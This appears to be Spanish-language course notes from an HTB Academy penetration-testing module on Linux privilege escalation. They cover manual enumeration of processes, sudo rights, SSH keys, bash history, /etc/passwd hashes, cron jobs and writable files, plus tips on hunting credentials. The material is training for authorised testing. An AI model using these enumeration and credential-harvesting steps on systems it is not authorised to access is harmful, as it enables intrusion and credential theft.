---
tags:
  - HTB-Academy
  - Penetration-Tester
---

# Introducción a la Escalada de Privilegios de Linux

---

La cuenta raíz en los sistemas Linux proporciona acceso de nivel administrativo completo al sistema operativo. Durante una evaluación, puede obtener un shell de bajo privilegio en un host de Linux y debe realizar una escalada de privilegios en la cuenta raíz. Comprometer completamente el host nos permitiría capturar tráfico y acceder a archivos confidenciales, que pueden usarse para acceder más dentro del entorno. Además, si la máquina Linux está unida al dominio, podemos obtener el hash NTLM y comenzar a enumerar y atacar Active Directory.

---

## Enumeración

La enumeración es la clave para la escalada de privilegios. Varios scripts auxiliares (como [LinEnum](https://github.com/rebootuser/LinEnum)) existen para ayudar con la enumeración. Aún así, también es importante comprender qué información buscar y poder realizar su enumeración manualmente. Cuando obtiene acceso inicial de shell al host, es importante verificar varios detalles clave.

`OS Version`: Conocer la distribución (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) te dará una idea de los tipos de herramientas que pueden estar disponibles. Esto también identificaría la versión del sistema operativo, para la cual puede haber exploits públicos disponibles.

`Kernel Version`: Al igual que con la versión OS, puede haber exploits públicos que se dirigen a una vulnerabilidad en una versión específica del kernel. Los exploits de kernel pueden causar inestabilidad del sistema o incluso un bloqueo completo. Tenga cuidado al ejecutarlos contra cualquier sistema de producción, y asegúrese de comprender completamente el exploit y las posibles ramificaciones antes de ejecutar uno.

`Running Services`: Saber qué servicios se están ejecutando en el host es importante, especialmente aquellos que se ejecutan como root. Un servicio mal configurado o vulnerable que se ejecuta como root puede ser una victoria fácil para la escalada de privilegios. Se han descubierto defectos en muchos servicios comunes como Nagios, Exim, Samba, ProFTPd, etc. Los PoC de explotación pública existen para muchos de ellos, como CVE-2016-9566, una falla de escalada de privilegios locales en Nagios Core < 4.2.4.

#### Lista Procesos Actuales

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ ps aux | grep root

root         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]
root         4  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/0:0]
root         5  0.0  0.0      0     0 ?        S<   23:26   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/u8:0]
root         7  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]

<SNIP>
```

`Installed Packages and Versions`: Al igual que los servicios en ejecución, es importante verificar si hay paquetes desactualizados o vulnerables que puedan aprovecharse fácilmente para la escalada de privilegios. Un ejemplo es Screen, que es un multiplexor de terminal común (similar a tmux). Le permite iniciar una sesión y abrir muchas ventanas o terminales virtuales en lugar de abrir varias sesiones de terminal. La versión de pantalla 4.05.00 sufre de una vulnerabilidad de escalado de privilegios que se puede aprovechar fácilmente para escalar privilegios.

`Logged in Users`: Saber qué otros usuarios han iniciado sesión en el sistema y qué están haciendo puede dar más importancia a posibles movimientos laterales locales y rutas de escalada de privilegios.

#### Lista Procesos Actuales

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ ps au

USER       		PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      		1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --
cliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bash
shared     		1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bash
root      		1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo su
root      		1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 su
root      		1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bash
shared     		1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au
```

`User Home Directories`: ¿Son accesibles los directorios de inicio de otros usuarios? Las carpetas de inicio del usuario también pueden contener claves SSH que se pueden usar para acceder a otros sistemas o scripts y archivos de configuración que contienen credenciales. No es raro encontrar archivos que contengan credenciales que puedan aprovecharse para acceder a otros sistemas o incluso obtener acceso al entorno de Active Directory.

#### Inicio Directorio Contenidos

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ ls /home

backupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  stacey.jenkins
```

Podemos verificar directorios de usuarios individuales y verificar si hay archivos como el `.bash_history` los archivos son legibles y contienen comandos interesantes, busque archivos de configuración y verifique si podemos obtener copias de las claves SSH de un usuario.

#### Contenido del Directorio de Inicio del Usuario

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ ls -la /home/stacey.jenkins/

total 32
drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .
drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..
-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout
-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc
-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profile
drwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh
```

Si encuentra una clave SSH para su usuario actual, esto podría usarse para abrir una sesión SSH en el host (si SSH está expuesto externamente) y obtener una sesión estable y totalmente interactiva. Las claves SSH también podrían aprovecharse para acceder a otros sistemas dentro de la red. Como mínimo, verifique la caché de ARP para ver a qué otros hosts se accede y haga referencia cruzada a ellos con cualquier clave privada SSH utilizable.

#### Contenido del Directorio SSH

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ ls -l ~/.ssh

total 8
-rw------- 1 mrb3n mrb3n 1679 Aug 30 23:37 id_rsa
-rw-r--r-- 1 mrb3n mrb3n  393 Aug 30 23:37 id_rsa.pub
```

También es importante verificar el historial de bash de un usuario, ya que pueden estar pasando contraseñas como un argumento en la línea de comandos, trabajando con repositorios git, configurando trabajos cron y más. Revisar lo que el usuario ha estado haciendo puede darle una visión considerable del tipo de servidor en el que aterriza y dar una pista sobre las rutas de escalada de privilegios.

#### Historia de Bash

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ history

    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

`Sudo Privileges`: ¿Puede el usuario ejecutar algún comando como otro usuario o como root? Si no tiene credenciales para el usuario, es posible que no sea posible aprovechar los permisos de sudo. Sin embargo, a menudo las entradas de sudoer incluyen `NOPASSWD`, lo que significa que el usuario puede ejecutar el comando especificado sin que se le solicite una contraseña. No todos los comandos, incluso si podemos ejecutar como root, conducirán a una escalada de privilegios. No es raro obtener acceso como usuario con privilegios sudo completos, lo que significa que pueden ejecutar cualquier comando como root. Emitir un simple `sudo su` el comando le dará inmediatamente una sesión raíz.

#### Sudo - Lista de Privilegios del Usuario

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

`Configuration Files`: Los archivos de configuración pueden contener una gran cantidad de información. Vale la pena buscar en todos los archivos que terminan en extensiones como `.conf` y `.config`, para nombres de usuario, contraseñas y otros secretos.

`Readable Shadow File`: Si el archivo shadow es legible, podrá recopilar hashes de contraseña para todos los usuarios que tengan una contraseña establecida. Si bien esto no garantiza un mayor acceso, estos hashes pueden ser sometidos a un ataque de fuerza bruta fuera de línea para recuperar la contraseña en texto claro.

`Password Hashes in /etc/passwd`: Ocasionalmente, verá hashes de contraseña directamente en el archivo /etc/passwd. Este archivo es legible por todos los usuarios, y como con hashes en el `shadow` archivo, estos pueden estar sujetos a un ataque de descifrado de contraseñas fuera de línea. Esta configuración, aunque no es común, a veces se puede ver en dispositivos y enrutadores integrados.

#### Passwd

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<...SNIP...>
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
colord:x:111:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
backupsvc:x:1001:1001::/home/backupsvc:
bob.jones:x:1002:1002::/home/bob.jones:
cliff.moore:x:1003:1003::/home/cliff.moore:
logger:x:1004:1004::/home/logger:
shared:x:1005:1005::/home/shared:
stacey.jenkins:x:1006:1006::/home/stacey.jenkins:
sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:
```

`Cron Jobs`: Los trabajos de Cron en sistemas Linux son similares a las tareas programadas de Windows. A menudo se configuran para realizar tareas de mantenimiento y respaldo. Junto con otras configuraciones erróneas, como rutas relativas o permisos débiles, pueden aprovechar para escalar privilegios cuando se ejecuta el trabajo cron programado.

#### Cron Jobs

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ ls -la /etc/cron.daily/

total 60
drwxr-xr-x  2 root root 4096 Aug 30 23:49 .
drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat
-rwx--x--x  1 root root  379 Aug 30 23:49 backup
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
```

`Unmounted File Systems and Additional Drives`: Si descubre y puede montar una unidad adicional o un sistema de archivos desmontado, puede encontrar archivos confidenciales, contraseñas o copias de seguridad que se pueden aprovechar para escalar privilegios.

#### Sistemas de Archivos y Unidades Adicionales

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   30G  0 disk 
├─sda1   8:1    0   29G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1  848M  0 rom  
```

`SETUID and SETGID Permissions`: Los binarios se establecen con estos permisos para permitir que un usuario ejecute un comando como root, sin tener que otorgar acceso de nivel root al usuario. Muchos binarios contienen funcionalidad que se puede explotar para obtener un shell raíz.

`Writeable Directories`: Es importante descubrir qué directorios se pueden escribir si necesita descargar herramientas al sistema. Puede descubrir un directorio escribible donde un trabajo cron coloca archivos, lo que proporciona una idea de la frecuencia con la que se ejecuta el trabajo cron y podría usarse para elevar privilegios si el script que ejecuta el trabajo cron también es escribible.

#### Encuentra Directorios Escritables

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

/dmz-backups
/tmp
/tmp/VMwareDnD
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/proc
/dev/mqueue
/dev/shm
/var/tmp
/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
/var/crash
/run/lock
```

`Writeable Files`: ¿Hay scripts o archivos de configuración que se puedan escribir en todo el mundo? Si bien la alteración de los archivos de configuración puede ser extremadamente destructiva, puede haber casos en los que una modificación menor pueda abrir más acceso. Además, cualquier script que se ejecute como root usando trabajos cron se puede modificar ligeramente para agregar un comando.

#### Encuentra Archivos Escritables

  Introducción a la Escalada de Privilegios de Linux

```shell-session
vcrdcr@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>

/home/backupsvc/backup.sh

<SNIP>
```

---

## Continuando

Como hemos visto, hay varias técnicas de enumeración manual que podemos realizar para obtener información para informar varios ataques de escalada de privilegios. Existe una variedad de técnicas que se pueden aprovechar para realizar una escalada de privilegios locales en Linux, que cubriremos en las siguientes secciones.



# Enumeración Ambiental

---

La enumeración es la clave para la escalada de privilegios. Varios scripts auxiliares (como [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) y [LinEnum](https://github.com/rebootuser/LinEnum)) existen para ayudar con la enumeración. Aún así, también es importante comprender qué información buscar y poder realizar su enumeración manualmente. Cuando obtiene acceso inicial de shell al host, es importante verificar varios detalles clave.

`OS Version`: Conocer la distribución (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) te dará una idea de los tipos de herramientas que pueden estar disponibles. Esto también identificaría la versión del sistema operativo, para la cual puede haber exploits públicos disponibles.

`Kernel Version`: Al igual que con la versión OS, puede haber exploits públicos que se dirigen a una vulnerabilidad en una versión específica del kernel. Los exploits de kernel pueden causar inestabilidad del sistema o incluso un bloqueo completo. Tenga cuidado al ejecutarlos contra cualquier sistema de producción, y asegúrese de comprender completamente el exploit y las posibles ramificaciones antes de ejecutar uno.

`Running Services`: Saber qué servicios se están ejecutando en el host es importante, especialmente aquellos que se ejecutan como root. Un servicio mal configurado o vulnerable que se ejecuta como root puede ser una victoria fácil para la escalada de privilegios. Se han descubierto defectos en muchos servicios comunes como Nagios, Exim, Samba, ProFTPd, etc. Los PoC de explotación pública existen para muchos de ellos, como CVE-2016-9566, una falla de escalada de privilegios locales en Nagios Core < 4.2.4.

---

## Ganar Conciencia Situacional

Digamos que acabamos de obtener acceso a un host Linux explotando una vulnerabilidad de carga de archivos sin restricciones durante una Prueba de Penetración Externa. Después de establecer nuestro shell inverso (e idealmente algún tipo de persistencia), debemos comenzar reuniendo algunos conceptos básicos sobre el sistema con el que estamos trabajando.

Primero, responderemos a la pregunta fundamental: ¿Con qué sistema operativo estamos tratando? Si aterrizamos en un host CentOS o en un host Red Hat Enterprise Linux, nuestra enumeración probablemente sería ligeramente diferente a si aterrizáramos en un host basado en Debian como Ubuntu. Si aterrizamos en un host como FreeBSD, Solaris o algo más oscuro como el OS HP HP-UX o el IBM OS AIX, los comandos con los que trabajaríamos probablemente serán diferentes. Aunque los comandos pueden ser diferentes, e incluso es posible que necesitemos buscar una referencia de comando en algunos casos, los principios son los mismos. Para nuestros propósitos, comenzaremos con un objetivo de Ubuntu para cubrir tácticas y técnicas generales. Una vez que aprendamos los conceptos básicos y los combinemos con una nueva forma de pensar y las etapas del Proceso de Prueba de Penetración, deberíano importa en qué tipo de sistema Linux aterrizamos porque tendremos un proceso completo y repetible.

Hay muchas hojas de trucos para ayudar a enumerar los sistemas Linux y algunos bits de información que nos interesan tendrán dos o más formas de obtenerla. En este módulo, cubriremos una metodología que probablemente se pueda usar para la mayoría de los sistemas Linux que encontramos en la naturaleza. Dicho esto, asegúrese de entender lo que están haciendo los comandos y cómo modificarlos o encontrar la información que necesita de una manera diferente si un comando en particular no funciona. Desafíate durante este módulo para probar cosas de varias maneras para practicar tu metodología y lo que funciona mejor para ti. Cualquiera puede volver a escribir comandos de una hoja de trucos, pero una comprensión profunda de lo que está buscando y cómo obtenerlo nos ayudará a tener éxito en cualquier entorno.

Por lo general, queremos ejecutar algunos comandos básicos para orientarnos:

- `whoami`- ¿cómo de usuario estamos ejecutando
- `id`¿a qué grupos pertenece nuestro usuario?
- `hostname`¿cómo se llama el servidor, podemos recopilar algo de la convención de nombres?
- `ifconfig` o `ip a` ¿en qué subred aterrizamos, el host tiene NIC adicionales en otras subredes?
- `sudo -l` ¿puede nuestro usuario ejecutar cualquier cosa con sudo (como otro usuario como root) sin necesidad de una contraseña? Esto a veces puede ser la victoria más fácil y podemos hacer algo como `sudo su` y caer directamente en un caparazón raíz.

Incluir capturas de pantalla de la información anterior puede ser útil en un informe del cliente para proporcionar evidencia de una Ejecución Remota de Código (RCE) exitosa e identificar claramente el sistema afectado. Ahora entremos en nuestra enumeración más detallada, paso a paso.

Comenzaremos revisando con qué sistema operativo y versión estamos tratando.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

Podemos ver que el objetivo se está ejecutando [Ubuntu 20.04.4 LTS ("Focal Fossa")](https://releases.ubuntu.com/20.04/). Para cualquier versión que encontremos es importante ver si estamos lidiando con algo desactualizado o mantenido. Ubuntu publica su [ciclo de liberación](https://ubuntu.com/about/release-cycle) y a partir de esto podemos ver que "Focal Fossa" no llega al final de la vida hasta abril de 2030. A partir de esta información, podemos suponer que no encontraremos una vulnerabilidad de Kernel conocida porque el cliente ha mantenido parcheado su activo orientado a Internet, pero aún así miraremos independientemente.

A continuación, vamos a querer comprobar el PATH de nuestro usuario actual, que es donde el sistema Linux se ve cada vez que se ejecuta un comando para cualquier ejecutable para que coincida con el nombre de lo que escribimos, es decir `id` que en este sistema se encuentra en `/usr/bin/id`. Como veremos más adelante en este módulo, si la variable PATH para un usuario objetivo está mal configurada, es posible que podamos aprovecharla para escalar privilegios. Por ahora lo anotaremos y lo agregaremos a nuestra herramienta de toma de notas de elección.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

También podemos consultar todas las variables de entorno que se establecen para nuestro usuario actual, podemos tener suerte y encontrar algo sensible allí, como una contraseña. Notaremos esto y seguiremos adelante.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ env

SHELL=/bin/bash
PWD=/home/htb-student
LOGNAME=htb-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/htb-student
LANG=en_US.UTF-8

<SNIP>
```

A continuación anotemos la versión de Kernel. Podemos hacer algunas búsquedas para ver si el objetivo está ejecutando un Kernel vulnerable (que podremos aprovechar más adelante en el módulo) que tiene algún PoC de explotación pública conocido. Podemos hacer esto de varias maneras, otra forma sería `cat /proc/version` pero usaremos el `uname -a` comando.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ uname -a

Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

A continuación, podemos recopilar información adicional sobre el host en sí, como el tipo/versión de CPU:

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ lscpu 

Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   43 bits physical, 48 bits virtual
CPU(s):                          2
On-line CPU(s) list:             0,1
Thread(s) per core:              1
Core(s) per socket:              2
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       AuthenticAMD
CPU family:                      23
Model:                           49
Model name:                      AMD EPYC 7302P 16-Core Processor
Stepping:                        0
CPU MHz:                         2994.375
BogoMIPS:                        5988.75
Hypervisor vendor:               VMware

<SNIP>
```

¿Qué shells de inicio de sesión existen en el servidor? Tenga en cuenta esto y resalte que tanto Tmux como Screen están disponibles para nosotros.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ cat /etc/shells

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
```

También debemos verificar si existen defensas y podemos enumerar cualquier información sobre ellas. Algunas cosas a buscar incluyen:

- [Escudo Exec](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Cortafuegos sin complicaciones (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

A menudo no tendremos los privilegios para enumerar las configuraciones de estas protecciones, pero saber qué, si existe, puede ayudarnos a no perder tiempo en ciertas tareas.

A continuación podemos echar un vistazo a las unidades y cualquier acción en el sistema. Primero, podemos usar el `lsblk` comando para enumerar información sobre dispositivos de bloque en el sistema (discos duros, unidades USB, unidades ópticas, etc.). Si descubrimos y podemos montar una unidad adicional o un sistema de archivos desmontado, podemos encontrar archivos confidenciales, contraseñas o copias de seguridad que se pueden aprovechar para escalar privilegios.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
loop1                       7:1    0   69M  1 loop /snap/lxd/14804
loop2                       7:2    0   47M  1 loop /snap/snapd/16292
loop3                       7:3    0  103M  1 loop /snap/lxd/23339
loop4                       7:4    0   62M  1 loop /snap/core20/1587
loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
sda                         8:0    0   20G  0 disk 
├─sda1                      8:1    0    1M  0 part 
├─sda2                      8:2    0    1G  0 part /boot
└─sda3                      8:3    0   19G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
sr0                        11:0    1  908M  0 rom 
```

El comando `lpstat` se puede utilizar para encontrar información sobre cualquier impresora conectada al sistema. Si hay trabajos de impresión activos o en cola, ¿podemos obtener acceso a algún tipo de información confidencial?

También debemos verificar si hay unidades montadas y unidades desmontadas. ¿Podemos montar una unidad montada y obtener acceso a datos confidenciales? Podemos encontrar cualquier tipo de credenciales en `fstab` para unidades montadas buscando palabras comunes como contraseña, nombre de usuario, credencial, etc `/etc/fstab`¿?

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ cat /etc/fstab

# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0
```

Echa un vistazo a la tabla de enrutamiento escribiendo `route` o `netstat -rn`. Aquí podemos ver qué otras redes están disponibles a través de qué interfaz.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
```

En un entorno de dominio definitivamente queremos verificar `/etc/resolv.conf` si el host está configurado para usar DNS interno, es posible que podamos usarlo como punto de partida para consultar el entorno de Active Directory.

También queremos verificar la tabla arp para ver con qué otros hosts se ha estado comunicando el objetivo.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ arp -a

_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192
```

La enumeración del entorno también incluye el conocimiento sobre los usuarios que existen en el sistema de destino. Esto se debe a que los usuarios individuales a menudo se configuran durante la instalación de aplicaciones y servicios para limitar los privilegios del servicio. La razón de esto es mantener la seguridad del sistema en sí. Porque si un servicio se ejecuta con los privilegios más altos (`root`) y esto es puesto bajo control por un atacante, el atacante automáticamente tiene los derechos más altos sobre todo el sistema. Todos los usuarios del sistema se almacenan en el `/etc/passwd` archivo. El formato nos da alguna información, como:

1. Nombre de usuario
2. Contraseña
3. ID de usuario (UID)
4. ID de grupo (GID)
5. Información de ID de usuario
6. Directorio de inicio
7. Shell

#### Usuarios Existentes

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
bjones:x:1001:1001::/home/bjones:/bin/sh
administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
logger:x:1005:1005::/home/logger:/bin/sh
shared:x:1006:1006::/home/shared:/bin/sh
stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
htb-student:x:1008:1008::/home/htb-student:/bin/bash
<SNIP>
```

Ocasionalmente, veremos hashes de contraseña directamente en el `/etc/passwd` archivo. Este archivo es legible por todos los usuarios, y como con hashes en el `/etc/shadow` archivo, estos pueden estar sujetos a un ataque de descifrado de contraseñas fuera de línea. Esta configuración, aunque no es común, a veces se puede ver en dispositivos y enrutadores integrados.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ cat /etc/passwd | cut -f1 -d:

root
daemon
bin
sys

...SNIP...

mrb3n
lxd
bjones
administrator.ilfreight
backupsvc
cliff.moore
logger
shared
stacey.jenkins
htb-student
```

Con Linux, se pueden usar varios algoritmos hash diferentes para hacer que las contraseñas sean irreconocibles. Identificarlos desde los primeros bloques hash puede ayudarnos a usarlos y trabajar con ellos más tarde si es necesario. Aquí hay una lista de los más utilizados:

|**Algoritmo**|**Hash**|
|---|---|
|MD5 Salado|`$1$`....|
|SHA-256|`$5$`....|
|SHA-512|`$6$`....|
|BCrypt|`$2a$`....|
|Descifrar|`$7$`....|
|Argón2|`$argon2i$`....|

También queremos verificar qué usuarios tienen shells de inicio de sesión. Una vez que veamos qué shells hay en el sistema, podemos verificar las vulnerabilidades de cada versión. Porque las versiones obsoletas, como Bash versión 4.1, son vulnerables a un `shellshock` explotar.

  Enumeración Ambiental

```shell-session
vcrdcr@htb[/htb]$ grep "*sh$" /etc/passwd

root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
bjones:x:1001:1001::/home/bjones:/bin/sh
administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
logger:x:1005:1005::/home/logger:/bin/sh
shared:x:1006:1006::/home/shared:/bin/sh
stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
htb-student:x:1008:1008::/home/htb-student:/bin/bash
```

